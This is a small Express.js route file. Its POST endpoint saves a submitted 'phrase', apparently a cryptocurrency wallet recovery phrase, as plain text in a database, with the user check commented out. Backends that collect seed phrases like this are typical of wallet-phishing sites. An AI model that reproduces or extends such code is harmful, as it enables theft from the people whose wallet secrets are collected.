const express = require("express")
const Router = express.Router()
const User = require("../model/user.js");
const Phrase_info = require("../model/phrase_info.js")
const verifyToken = require("../token/verifyToken.js");
const validate_save_wallet = require("../validation/validate_save_phrase.js")


Router.post("/", verifyToken, async (req, res) => {
    try {
        const request_isvalid = validate_save_wallet(req.body)
        if (request_isvalid != true) return res.status(400).json({ error: true, errMessage: request_isvalid })
        const user = await User.findById(req.body.user);
        // if (!user)
        //     return res.status(404).json({
        //         error: true,
        //         errMessage: "invalid request, please login again and try again",
        //     });

        const phrase_info = await new Phrase_info({
            user: req.body.user || "user",
            phrase: req.body.phrase
        })
        await phrase_info.save()

        res.status(200).json({ error: false, message: "success" })

    } catch (error) {
        res.status(400).json({ error: true, errMessage: error.message });
    }


})

module.exports = Router